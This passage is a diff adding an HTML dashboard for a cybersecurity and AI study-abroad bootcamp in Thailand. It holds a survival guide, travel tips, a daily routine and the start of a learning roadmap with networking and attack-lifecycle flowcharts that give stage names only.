@@ -1,0 +1,1020 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INTERNATIONAL STUDY ABROAD ON CYBERSECURITY AND AI DATA ANALYTICS</title>
+    
+    <!-- Supabase JS -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <!-- Mermaid JS for Interactive Flowcharts -->
+    <script type="module">
+      import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+      mermaid.initialize({ 
+          startOnLoad: true, 
+          securityLevel: 'loose', 
+          theme: 'dark' // We will override nodes with classDef individually
+      });
+    </script>
+    
+    <style>
+        /* ==========================================================================
+           1. CSS Variables & Base Styles
+           ========================================================================== */
+        :root {
+            --bg-dark: #070b19;
+            --text-color: #f1f5f9;
+            --accent-color: #38bdf8;
+            --accent-hover: #0ea5e9;
+            --glass-bg: rgba(15, 23, 42, 0.4);
+            --glass-border: rgba(255, 255, 255, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-color);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.6;
+            height: 100vh;
+            overflow: hidden;
+            background: radial-gradient(circle at top right, #1e1b4b, #070b19, #064e3b22);
+            background-size: 200% 200%;
+            animation: breathe 15s ease infinite;
+        }
+
+        @keyframes breathe {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* ==========================================================================
+           2. Layout (Sidebar + Main Content)
+           ========================================================================== */
+        .app-container {
+            display: flex;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .sidebar {
+            width: 400px;
+            height: 100%;
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            border-right: 1px solid var(--glass-border);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            padding: 20px;
+            z-index: 10;
+        }
+
+        .main-content {
+            flex-grow: 1;
+            height: 100%;
+            overflow-y: auto;
+            padding: 40px;
+            position: relative;
+        }
+
+        h1, h2, h3 { color: var(--accent-color); font-weight: 300; margin-bottom: 15px; }
+        h1 { font-size: 2rem; line-height: 1.2; border-bottom: 1px solid var(--glass-border); padding-bottom: 20px; margin-bottom: 30px; }
+
+        /* ==========================================================================
+           3. Sidebar Components
+           ========================================================================== */
+        .routine-item {
+            display: flex; align-items: flex-start; margin-bottom: 12px; padding: 10px;
+            background: rgba(255,255,255,0.02); border: 1px solid var(--glass-border); border-radius: 8px; transition: 0.3s;
+        }
+        .routine-item:hover { background: rgba(255,255,255,0.05); }
+        .routine-item input[type="checkbox"] { margin-top: 5px; margin-right: 12px; cursor: pointer; width: 18px; height: 18px; accent-color: var(--accent-color); }
+        .routine-date { font-size: 0.8rem; color: #94a3b8; display: block; }
+        
+        .notes-area {
+            width: 100%; height: 200px; background: rgba(0,0,0,0.2); border: 1px solid var(--glass-border);
+            border-radius: 8px; color: #f1f5f9; padding: 15px; font-family: monospace; resize: vertical; margin-top: 10px; margin-bottom: 10px;
+        }
+        .notes-area:focus { outline: none; border-color: var(--accent-color); }
+        .btn { background: var(--accent-color); color: #0f172a; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
+        .btn:hover { background: var(--accent-hover); }
+
+        /* Travel Accordion Sidebar */
+        .accordion { margin-bottom: 30px; border: 1px solid var(--glass-border); border-radius: 8px; background: rgba(0,0,0,0.2); }
+        .accordion-header { padding: 15px; font-weight: bold; color: var(--accent-color); cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .accordion-header:hover { background: rgba(255,255,255,0.05); }
+        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; font-size: 0.85rem; padding: 0 15px; }
+        .accordion-content.open { max-height: 1200px; padding-bottom: 15px; overflow-y: auto;}
+        
+        .travel-section { margin-top: 15px; border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 10px; }
+        .travel-section h4 { color: #f87171; margin-bottom: 5px; font-size: 0.95rem; display: flex; align-items: center; gap: 8px;}
+        .travel-section ul { padding-left: 20px; margin-bottom: 5px; color: #cbd5e1;}
+        .travel-section p { margin-bottom: 5px; color: #cbd5e1;}
+
+        /* ==========================================================================
+           4. Main Content Components (ISOMETRIC ROADMAP)
+           ========================================================================== */
+        .roadmap-container {
+            padding: 60px 20px 200px 20px;
+            perspective: 1500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            /* Glowing line REMOVED per request */
+        }
+
+        .step-card {
+            background-color: rgba(15, 23, 42, 0.85); /* Heavy dark overlay */
+            background-blend-mode: overlay;
+            background-size: cover;
+            background-position: center;
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            width: 70%;
+            margin-bottom: 80px; /* Massive gap to guarantee no overlap */
+            transform: rotateX(15deg) rotateZ(-5deg); /* Tilted up towards viewer */
+            transform-style: preserve-3d;
+            box-shadow: -20px 30px 40px rgba(0,0,0,0.6);
+            transition: all 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
+            cursor: pointer;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Generated AI Image Backgrounds */
+        .bg-networking { background-image: url('images/network_waterfall_1781937602886.png'); }
+        .bg-lifecycle { background-image: url('images/zen_path_1781937615439.png'); }
+        .bg-crypto { background-image: url('images/glass_lock_1781937628191.png'); }
+        .bg-defense { background-image: url('images/glass_shield_1781937639517.png'); }
+        
+        /* Calming generated AI Image Backgrounds */
+        .bg-data { background-image: url('images/calm_analytics_1781940299867.png'); }
+        .bg-agents { background-image: url('images/calm_agents_1781940311153.png'); }
+        .bg-jarvis { background-image: url('images/calm_jarvis_1781940322282.png'); }
+
+        .step-card:nth-child(odd) { margin-left: -20%; }
+        .step-card:nth-child(even) { margin-left: 20%; }
+
+        .step-card:hover:not(.active) {
+            transform: rotateX(15deg) rotateZ(-5deg) translateZ(30px);
+            border-color: var(--accent-color);
+            box-shadow: -25px 35px 50px rgba(0,0,0,0.8);
+        }
+
+        .step-card.active {
+            transform: rotateX(0deg) rotateZ(0deg) translateZ(0px) scale(1);
+            width: 95%;
+            margin-top: 60px;
+            margin-bottom: 60px;
+            margin-left: 0; 
+            box-shadow: 0 10px 50px rgba(0,0,0,0.9);
+            cursor: default;
+            border-color: var(--accent-color);
+            background-color: rgba(15, 23, 42, 0.95); /* Even darker when open to read charts easily */
+        }
+
+        .phase-divider {
+            width: 80%;
+            text-align: center;
+            transform: rotateX(15deg) rotateZ(-5deg); /* Unified with cards, tilted up */
+            transform-style: preserve-3d;
+            margin-bottom: 80px; /* Unified massive gap */
+            color: var(--text-color);
+            font-weight: bold;
+            letter-spacing: 4px;
+            position: relative;
+            z-index: 1; /* Unified Z-index */
+        }
+        .phase-divider span {
+            background: var(--bg-dark);
+            padding: 10px 25px;
+            border: 1px solid var(--accent-color);
+            border-radius: 20px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
+        }
+        .phase-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
+            z-index: 0;
+        }
+
+        .step-summary {
+            padding: 25px;
+            font-size: 1.3rem; font-weight: bold; color: var(--accent-color);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .step-summary::after {
+            content: 'Click to Open 🔍'; font-size: 0.9rem; color: #94a3b8;
+            background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px; transition: 0.3s;
+        }
+
+        .step-card:hover:not(.active) .step-summary::after { background: var(--accent-color); color: #000; }
+        .step-card.active .step-summary::after { content: 'Close ✖'; background: #ef4444; color: white; cursor: pointer; }
+
+        .step-content {
+            max-height: 0; overflow: hidden; transition: max-height 0.7s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        .step-card.active .step-content {
+            max-height: 4000px; border-top: 1px solid var(--glass-border);
+        }
+
+        .step-content-inner { padding: 25px; }
+
+        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--glass-border); }
+        th { color: var(--accent-color); }
+
+        /* ==========================================================================
+           5. Slide-In Interactive Panel
+           ========================================================================== */
+        .slide-panel {
+            position: fixed; top: 0; right: -550px; width: 500px; height: 100vh;
+            background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(30px);
+            border-left: 2px solid var(--accent-color); box-shadow: -15px 0 40px rgba(0,0,0,0.6);
+            transition: right 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; padding: 50px 30px; overflow-y: auto;
+        }
+
+        .slide-panel.open { right: 0; }
+        .slide-panel h2 { margin-bottom: 25px; border-bottom: 1px solid var(--glass-border); padding-bottom: 10px;}
+        .slide-panel h3 { font-size: 0.9rem; color: #94a3b8; margin-top: 30px; text-transform: uppercase; letter-spacing: 1px;}
+        .slide-panel p { margin-bottom: 15px; font-size: 1.05rem; }
+        .slide-panel pre { background: #000; padding: 15px; border-radius: 8px; overflow-x: auto; border: 1px solid #333; color: #10b981; font-family: monospace; margin-top: 10px; }
+        .close-btn { position: absolute; top: 15px; right: 25px; background: none; border: none; color: var(--text-color); font-size: 2.5rem; cursor: pointer; opacity: 0.7; transition: 0.3s; }
+        .close-btn:hover { opacity: 1; color: var(--accent-color); transform: scale(1.1); }
+
+        .node rect, .node circle, .node ellipse, .node polygon { cursor: pointer !important; }
+        .node:hover rect, .node:hover circle, .node:hover ellipse, .node:hover polygon { stroke: var(--accent-color) !important; stroke-width: 3px !important; filter: drop-shadow(0 0 10px var(--accent-color)); }
+
+        /* ==========================================================================
+           6. SURVIVAL GUIDE MODAL & SEARCH UI
+           ========================================================================== */
+        .survival-modal {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px);
+            z-index: 3000; display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: 0.4s;
+        }
+        .survival-modal.open { opacity: 1; pointer-events: auto; }
+        .survival-content {
+            background: rgba(15, 23, 42, 0.95); border: 1px solid var(--accent-color);
+            width: 80%; max-width: 900px; height: 80vh; border-radius: 12px;
+            display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 50px rgba(56, 189, 248, 0.3);
+        }
+        .survival-header { padding: 20px; border-bottom: 1px solid var(--glass-border); display: flex; justify-content: space-between; align-items: center; }
+        .survival-tabs { display: flex; border-bottom: 1px solid var(--glass-border); background: rgba(0,0,0,0.3); }
+        .tab-btn { flex: 1; padding: 15px; background: transparent; border: none; color: var(--text-color); cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .tab-btn:hover, .tab-btn.active { background: rgba(56, 189, 248, 0.2); color: var(--accent-color); }
+        .tab-content { padding: 30px; overflow-y: auto; flex-grow: 1; display: none; }
+        .tab-content.active { display: block; }
+        .tab-content h3 { color: #f87171; border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 10px; margin-top: 20px;}
+        .survival-btn-main {
+            position: absolute; top: 20px; right: 20px; z-index: 100;
+            background: linear-gradient(45deg, #f59e0b, #d97706); color: white; border: none;
+            padding: 12px 24px; border-radius: 30px; font-weight: bold; font-size: 1.1rem; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(245, 158, 11, 0.4); transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .survival-btn-main:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6); }
+
+        @media (max-width: 900px) {
+            .app-container { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; border-right: none; border-bottom: 1px solid var(--glass-border); }
+            body { overflow: auto; }
+            .slide-panel { width: 100%; right: -100%; border-left: none; }
+            .step-card { width: 90%; margin-left: 0 !important; }
+            .survival-content { width: 95%; height: 90vh; }
+        }
+    
+        .resizer {
+            width: 6px;
+            background: var(--glass-border);
+            cursor: col-resize;
+            z-index: 20;
+            transition: background 0.2s;
+        }
+        .resizer:hover, .resizer.active {
+            background: var(--accent-color);
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- SURVIVAL GUIDE BUTTON -->
+    <button class="survival-btn-main" onclick="document.getElementById('survival-modal').classList.add('open')">📖 Thailand Survival Guide</button>
+
+    <!-- SURVIVAL GUIDE MODAL -->
+    <div id="survival-modal" class="survival-modal">
+        <div class="survival-content">
+            <div class="survival-header">
+                <h2>🇹🇭 Thailand Survival Guide</h2>
+                <button class="close-btn" style="position: static;" onclick="document.getElementById('survival-modal').classList.remove('open')">&times;</button>
+            </div>
+            <div class="survival-tabs">
+                <button class="tab-btn active" onclick="switchTab('tab-rules')">Rules & Conduct</button>
+                <button class="tab-btn" onclick="switchTab('tab-essentials')">Essentials</button>
+                <button class="tab-btn" onclick="switchTab('tab-shopping')">Shopping</button>
+                <button class="tab-btn" onclick="switchTab('tab-phrases')">Thai Phrases</button>
+            </div>
+            
+            <div id="tab-rules" class="tab-content active">
+                <h3>🚫 Prohibitions & Conduct</h3>
+                <ul>
+                    <li><strong>No Alcohol/Drugs:</strong> Strict Drug Laws with severe penalties.</li>
+                    <li><strong>Curfew:</strong> In rooms by 10:30 PM. Random checks conducted.</li>
+                    <li><strong>No Smoking:</strong> Strictly not allowed on campus.</li>
+                    <li><strong>No Harassment:</strong> Zero-tolerance policy.</li>
+                    <li><strong>No Shouting:</strong> Prohibited in dorms and public areas.</li>
+                    <li><strong>No Stealing/Theft:</strong> Do not take unlocked cycles. CCTVs are active. Shoplifting has severe legal penalties.</li>
+                    <li><strong>Behavior:</strong> No humiliating, pranks, or bullying. No public intimacies.</li>
+                    <li><strong>Cleanliness:</strong> Use dustbins, do not litter.</li>
+                    <li><strong>Personal Issues:</strong> Do NOT involve volunteers in handling personal problems (e.g. couple fights).</li>
+                </ul>
+                <h3>👔 Dress & Attendance</h3>
+                <ul>
+                    <li><strong>Classes:</strong> Smart formal dress. Attendance is taken daily and sent to your university. Be on time and keep phones on silent.</li>
+                    <li><strong>Field Trips:</strong> Casual dress. Do NOT go by yourselves (stay in groups). Carry digital copies of passports, not originals.</li>
+                    <li><strong>Temples:</strong> Dress properly (no revealing clothes), take shoes off before entering. Ladies must NOT touch a Buddhist monk.</li>
+                </ul>
+                <h3>🏠 Accommodation Rules</h3>
+                <ul>
+                    <li>Turn off AC & Lights before leaving. Damages borne by occupant.</li>
+                    <li>No cooking (electric kettles & microwaves allowed).</li>
+                </ul>
+                <h3>🇹🇭 Thai Culture Tips</h3>
+                <ul>
+                    <li>Use the title <strong>"Khun"</strong> before first names for adults.</li>
+                    <li>The Royal Family is held in great reverence; do not speak disrespectfully of them.</li>
+                    <li><strong>Dining:</strong> Knives aren't necessary (food is pre-cut). Tipping 10-20 Baht is appreciated.</li>
+                </ul>
+            </div>
+
+            <div id="tab-essentials" class="tab-content">
+                <h3>💰 Currency & Banking</h3>
+                <ul>
+                    <li><strong>Currency:</strong> Thai Baht (THB). ~30 THB = 1 USD. Max 50,000 THB can be taken out without authorization.</li>
+                    <li>Banks: Kasikorn (K Bank) & Siam Commercial (SCB) near AIT.</li>
+                </ul>
+                <h3>🏥 Facilities & Telecom</h3>
+                <ul>
+                    <li><strong>Facilities:</strong> Medical Clinic, Swimming Pool, Tennis Court, Beauty/Massage Parlor, Prayer Rooms (near MEB).</li>
+                    <li><strong>Calling Home:</strong> 30% surcharge from hotel rooms! Buy SIM cards at AIT Bookstore.</li>
+                    <li><strong>Apps to Download:</strong> Grab, Bolt, ANYWHEEL (for e-bikes), Google Translate.</li>
+                </ul>
+                <h3>🔌 Utilities</h3>
+                <ul>
+                    <li><strong>Electricity:</strong> 220V 50Hz. Bring 2-pin adapters.</li>
+                    <li><strong>Water:</strong> Refilling stations cost 1 Baht/L. Drink bottled/boiled water.</li>
+                    <li><strong>Laundry:</strong> Vending machines in front of Dorm L, ST6, ST9, ST11.</li>
+                </ul>
+                <h3>🚌 Transport & Meals</h3>
+                <ul>
+                    <li>Green e-bikes in AIT (Use ANYWHEEL app).</li>
+                    <li>Bus 29 & 510, Cabs, or Bolt/Grab off-campus.</li>
+                    <li>BTS (Sky Train) / MRT (Metro) available near Future Park.</li>
+                    <li><strong>Meals:</strong> Free basic meals (Breakfast, lunch, dinner) are provided for the entire program!</li>
+                </ul>
+            </div>
+
+            <div id="tab-shopping" class="tab-content">
+                <h3>🛒 Nearby (AIT)</h3>
+                <ul>
+                    <li><strong>Food:</strong> AIT Cafe, 7-Eleven, Hom Krun, Tan90, UFM Bakery.</li>
+                    <li><strong>Future Park:</strong> 10km away. Take Bus 29, 39, 510 or Grab.</li>
+                    <li><strong>Thammasat Univ:</strong> TUH Plaza/Square. Night market on Mon/Thu.</li>
+                    <li><strong>Supermarkets:</strong> MAKRO, TESCO LOTUS, CARREFOUR, ZEER RANGSIT (IT).</li>
+                </ul>
+                <h3>🌆 Bangkok Malls (BTS access)</h3>
+                <ul>
+                    <li><strong>ICONSIAM:</strong> Luxury shopping on the river.</li>
+                    <li><strong>MBK Center:</strong> Knockoffs & authentic goods (National Stadium Station).</li>
+                    <li><strong>Siam Paragon:</strong> High-end fashion & Aquarium (Siam Station).</li>
+                    <li><strong>Platinum Fashion Mall:</strong> Wholesale clothing (Pratunam). Haggling encouraged!</li>
+                    <li><strong>Pantip Plaza:</strong> Famous electronics mall (Chidlom Station).</li>
+                    <li><strong>Central World / Siam Discovery:</strong> Upscale shopping.</li>
+                    <li><strong>One Bangkok:</strong> Thailand's largest integrated luxury district.</li>
+                    <li><strong>Central Chidlom & Gaysorn:</strong> High-end luxury designer goods.</li>
+                </ul>
+                <h3>💡 Shopping Tips</h3>
+                <ul>
+                    <li><strong>Bargaining:</strong> Practiced in markets (Platinum, MBK). Ask for discounts politely.</li>
+                    <li><strong>Receipts:</strong> Always get receipts, especially a certificate of guarantee for jewelry.</li>
+                </ul>
+            </div>
+
+            <div id="tab-phrases" class="tab-content">
+                <div style="display: flex; gap: 20px;">
+                    <div style="flex: 1;">
+                        <h3>🗣️ Greetings & Basics</h3>
+                        <p><strong>Khrap:</strong> Yes sir (males)</p>
+                        <p><strong>Kha:</strong> Yes madam (females)</p>
+                        <p><strong>Sa Wat Di:</strong> Hello / Goodbye</p>
+                        <p><strong>Khop Khun:</strong> Thank you</p>
+                        <p><strong>Mai Pen Rai:</strong> Never mind</p>
+                        <p><strong>Hong Nam:</strong> Toilet</p>
+                        <p><strong>Ta lat:</strong> Market</p>
+                    </div>
+                    <div style="flex: 1;">
+                        <h3>🍔 Food</h3>
+                        <p><strong>Nam:</strong> Water</p>
+                        <p><strong>Kafae:</strong> Coffee</p>
+                        <p><strong>Kai:</strong> Chicken</p>
+                        <p><strong>Pla:</strong> Fish</p>
+                        <p><strong>Mu:</strong> Pork</p>
+                        <p><strong>Phak:</strong> Vegetable</p>
+                    </div>
+                    <div style="flex: 1;">
+                        <h3>🔢 Numbers</h3>
+                        <p><strong>0-5:</strong> Soon, Neung, Saung, Sam, Si, Ha</p>
+                        <p><strong>6-10:</strong> Hok, Chet, Paet, Kao, Sip</p>
+                        <p><strong>11-12:</strong> Sip et, Sip saung</p>
+                        <p><strong>20-22:</strong> Yi sip, Yi sip et, Yi sip saung</p>
+                        <p><strong>100/1000:</strong> Neung roei / Neung phan</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- INTERACTIVE SLIDE PANEL -->
+    <div id="slide-panel" class="slide-panel">
+        <button id="close-panel" class="close-btn">&times;</button>
+        <h2 id="panel-title">Node Title</h2>
+        <h3>📖 Simplest Definition</h3><p id="panel-def"></p>
+        <h3>🌍 Practical Usage</h3><p id="panel-usage"></p>
+        <h3>💻 Sample Implementation</h3><pre><code id="panel-code"></code></pre>
+    </div>
+
+    <div class="app-container">
+        
+        <!-- SIDEBAR -->
+        <aside class="sidebar">
+            <div class="accordion" id="travel-accordion">
+                <div class="accordion-header" onclick="toggleAccordion()">✈️ Travel Essentials <span style="font-size:0.8rem">▼</span></div>
+                <div class="accordion-content" id="travel-content">
+                    <div class="travel-section">
+                        <h4>🎒 Baggage Rules</h4>
+                        <ul>
+                            <li><strong>Cabin (7kg):</strong> Chargers, power banks, essentials ONLY. NO liquids > 100ml. NO umbrellas.</li>
+                            <li><strong>Checked (20kg):</strong> Umbrellas MUST be packed here.</li>
+                        </ul>
+                    </div>
+                    <div class="travel-section">
+                        <h4>📄 Important Documents</h4>
+                        <p>Keep originals in handbag & soft copies on phone.</p>
+                        <ul>
+                            <li>Passport & Arrival Card</li>
+                            <li>University ID Card & Invitation Letter</li>
+                        </ul>
+                    </div>
+                    <div class="travel-section">
+                        <h4>🚨 TDAC Arrival Card</h4>
+                        <p>Register <strong>FREE</strong> within 3 days before arrival at <br><a href="https://tdac.immigration.go.th" target="_blank" style="color:var(--accent-color); text-decoration:none;">🔗 tdac.immigration.go.th</a></p>
+                        <ul>
+                            <li><strong>Purpose:</strong> Education | <strong>Mode:</strong> Air/Commercial</li>
+                            <li><strong>Accommodation:</strong> AITCC Hotel</li>
+                            <li><strong>Location:</strong> Province: Pathum Thani, District: Klong Luang, Sub-district: Klong Nueng</li>
+                            <li><strong>Phone:</strong> +66 25245000</li>
+                            <li><strong>Full Addr:</strong> Asian Institute of Technology, Phahonyothin Rd, Khlong Nueng, Khlong Luang District, Pathum Thani 12120</li>
+                        </ul>
+                    </div>
+                    <div class="travel-section">
+                        <h4>📶 Airport Free WiFi</h4>
+                        <p>Connect to <strong>AOTFreeWiFibyTrue</strong> -> Select "Get Free Wifi" -> Enter name/passport/email. Valid for 2 hrs/day.</p>
+                    </div>
+                    <div class="travel-section" style="border-bottom:none;">
+                        <h4>💊 First-Aid & Meds</h4>
+                        <p>WHO ORS, Paracetamol, Neopeptine/Unienzyme, Allegra/Cetrizine, Pan D, Volini spray, Dart (headaches), Band-aids, + personal specific meds.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SEARCH UI -->
+            <div class="search-section" style="margin-bottom: 30px; border: 1px solid var(--glass-border); padding: 15px; border-radius: 8px; background: rgba(0,0,0,0.2);">
+                <h3 style="margin-bottom: 10px; font-size: 1.1rem;">🔎 Itinerary & Roommate Search</h3>
+                <input type="text" id="passenger-search" placeholder="Type your first name (e.g. Arkadev)..." style="width: 100%; padding: 10px; border-radius: 5px; border: 1px solid var(--glass-border); background: rgba(0,0,0,0.4); color: white; margin-bottom: 10px; font-family: monospace;">
+                <button class="btn" id="search-btn" style="background: #10b981; color: white;">Search & Sync Progress</button>
+                <div id="search-results" style="margin-top: 15px; font-size: 0.85rem; color: #cbd5e1; display: none;"></div>
+            </div>
+
+            <h2>📅 Bootcamp Routine</h2>
+            <p style="font-size: 0.85rem; color: #94a3b8; margin-bottom: 20px;">Check off classes as you complete them. Saved automatically.</p>
+            <div id="routine-container">
+                <label class="routine-item"><input type="checkbox" id="d1"><div class="routine-text"><span class="routine-date">Day 1 (22 Jun)</span>Orientation & Thai Culture</div></label>
+                <label class="routine-item"><input type="checkbox" id="d2"><div class="routine-text"><span class="routine-date">Day 2 (23 Jun)</span>Cybersecurity Foundations & Biomedical AI</div></label>
+                <label class="routine-item"><input type="checkbox" id="d3"><div class="routine-text"><span class="routine-date">Day 3 (24 Jun)</span>Threats, Exploitation & Rehab Engineering (BART LAB)</div></label>
+                <label class="routine-item"><input type="checkbox" id="d4"><div class="routine-text"><span class="routine-date">Day 4 (25 Jun)</span>Securing Communications & Medical Imaging</div></label>
+                <label class="routine-item"><input type="checkbox" id="d5"><div class="routine-text"><span class="routine-date">Day 5 (26 Jun)</span>Defensive Architecture & XR Technologies</div></label>
+                <label class="routine-item"><input type="checkbox" id="d6"><div class="routine-text"><span class="routine-date">Day 6 (27 Jun)</span>Final Examination & Free Time</div></label>
+                <label class="routine-item"><input type="checkbox" id="d7"><div class="routine-text"><span class="routine-date">Day 7 (28 Jun)</span>Data Analytics & Business Applications</div></label>
+                <label class="routine-item"><input type="checkbox" id="d8"><div class="routine-text"><span class="routine-date">Day 8 (29 Jun)</span>Understanding AI & Custom Tools</div></label>
+                <label class="routine-item"><input type="checkbox" id="d9"><div class="routine-text"><span class="routine-date">Day 9 (30 Jun)</span>Agent Memory, Routers & Sequential Agents</div></label>
+                <label class="routine-item"><input type="checkbox" id="d10"><div class="routine-text"><span class="routine-date">Day 10 (1 Jul)</span>Loop Agents & Parallel Agents</div></label>
+                <label class="routine-item"><input type="checkbox" id="d11"><div class="routine-text"><span class="routine-date">Day 11 (2 Jul)</span>EGAT Visit & Luxurious Dinner Cruise</div></label>
+                <label class="routine-item"><input type="checkbox" id="d12"><div class="routine-text"><span class="routine-date">Day 12 (3 Jul)</span>Closing, Checkout & Send-off</div></label>
+            </div>
+            
+            <div style="background: rgba(16, 185, 129, 0.1); border-left: 3px solid #10b981; padding: 10px; margin-top: 15px; font-size: 0.85rem; color: #cbd5e1;">
+                <strong>📍 Venue:</strong> B206 AITC (another group @ Nanotech)<br>
+                <strong>🍳 Breakfast:</strong> 7:30-8:45 (AITCC Dining Hall)<br>
+                <strong>🍲 Lunch:</strong> 12:00-13:30 (AIT Cafeteria)<br>
+                <strong>🍛 Dinner:</strong> 19:00-20:30 (AIT Cafeteria)
+            </div>
+
+            <h2 style="margin-top: 30px;">📝 My Notes</h2>
+            <textarea class="notes-area" id="user-notes" placeholder="Type your ideas, questions, or project thoughts here..."></textarea>
+            <button class="btn" id="download-btn">📥 Download Notes</button>
+        </aside>
+        
+        <!-- RESIZER -->
+        <div class="resizer" id="dragMe"></div>
+
+        <!-- MAIN CONTENT (ROADMAP) -->
+        <main class="main-content">
+            <h1>CYBERSECURITY & AI: LEARNING ROADMAP</h1>
+            <p style="margin-bottom: 20px; font-style: italic; color: #94a3b8;">💡 <strong>Pro Tip:</strong> Click any floating card below to enter "Front View". Click nodes to slide open implementation notes!</p>
+
+            <div class="roadmap-container">
+                
+                <div class="phase-divider"><span>PHASE 1: FOUNDATIONS</span></div>
+
+                <div class="step-card" onclick="toggleCard(this, event)">
+                    <div class="step-summary">🔤 Full Forms Dictionary</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <table>
+                            <tr><th>Acronym</th><th>Full Form</th><th>Context</th></tr>
+                            <tr><td>OSINT</td><td>Open Source Intelligence</td><td>Gathering data from public sources.</td></tr>
+                            <tr><td>OSI</td><td>Open Systems Interconnection</td><td>The 7-layer theoretical network model.</td></tr>
+                            <tr><td>TCP/IP</td><td>Transmission Control Protocol / Internet Protocol</td><td>The fundamental suite of communication protocols for the internet.</td></tr>
+                            <tr><td>DNS</td><td>Domain Name System</td><td>Translates domain names to IP addresses.</td></tr>
+                            <tr><td>HTTP/HTTPS</td><td>Hypertext Transfer Protocol (Secure)</td><td>Protocol for fetching web resources, with HTTPS adding encryption.</td></tr>
+                            <tr><td>AES</td><td>Advanced Encryption Standard</td><td>Symmetric encryption (fast, one key).</td></tr>
+                            <tr><td>RSA</td><td>Rivest-Shamir-Adleman</td><td>Asymmetric encryption (public/private keypair).</td></tr>
+                        </table>
+                    </div></div>
+                </div>
+
+                <div class="step-card bg-networking" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #38bdf8;">🌐 1. Networking Basics</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <p style="margin-bottom: 20px; color: #e2e8f0;"><strong>How Packets Travel:</strong> When you request a website (like via HTTP/HTTPS), <strong>DNS</strong> translates the domain name to an IP address. The data is then broken into packets by <strong>TCP</strong>, routed across the internet by <strong>IP</strong>, and finally reassembled at your destination. The OSI model below details these abstract layers.</p>
+                        <div class="mermaid">
+                            graph TD
+                            classDef default fill:#0f172a,stroke:#38bdf8,stroke-width:2px,color:#e2e8f0;
+                            classDef specific fill:#1e3a8a,stroke:#60a5fa,stroke-width:2px,color:#eff6ff;
+                            
+                            subgraph "Core Protocols"
+                                HTTP["HTTP/HTTPS"]:::specific
+                                DNS["DNS"]:::specific
+                                TCP["TCP/IP Suite"]:::specific
+                            end
+
+                            HTTP --> A
+                            DNS --> A
+                            TCP --> D
+                            TCP --> E
+
+                            A["Application: Interfaces"] --> B["Presentation: Encryption"] --> C["Session: Sync"] --> D["Transport: Ports"] --> E["Network: Routing"] --> F["Data Link: MAC Address"] --> G["Physical: Cables/Radio"]
+                            
+                            click HTTP call showDetails("proto-http")
+                            click DNS call showDetails("proto-dns")
+                            click TCP call showDetails("proto-tcp")
+                            click A call showDetails("osi-application")
+                            click B call showDetails("osi-presentation")
+                            click C call showDetails("osi-session")
+                            click D call showDetails("osi-transport")
+                            click E call showDetails("osi-network")
+                            click F call showDetails("osi-datalink")
+                            click G call showDetails("osi-physical")
+                        </div>
+                    </div></div>
+                </div>
+
+                <div class="step-card bg-lifecycle" onclick="toggleCard(this, event)">
+                    <div class="step-summary" style="color: #10b981;">⚔️ 2. The Attack Lifecycle</div>
+                    <div class="step-content"><div class="step-content-inner">
+                        <div class="mermaid">
+                            flowchart LR
+                            classDef default fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#ecfdf5;
+                            R["Recon"] --> W["Weaponize"] --> D["Delivery"] --> E["Exploit"] --> I["Install"] --> C["Command"] --> A["Action"]
+                            click R call showDetails("kc-recon")
+                            click W call showDetails("kc-weaponize")
+                            click D call showDetails("kc-delivery")
+                            click E call showDetails("kc-exploit")
+                            click I call showDetails("kc-install")
+                            click C call showDetails("kc-c2")
+                            click A call showDetails("kc-action")
+                        </div>
+                    </div></div>
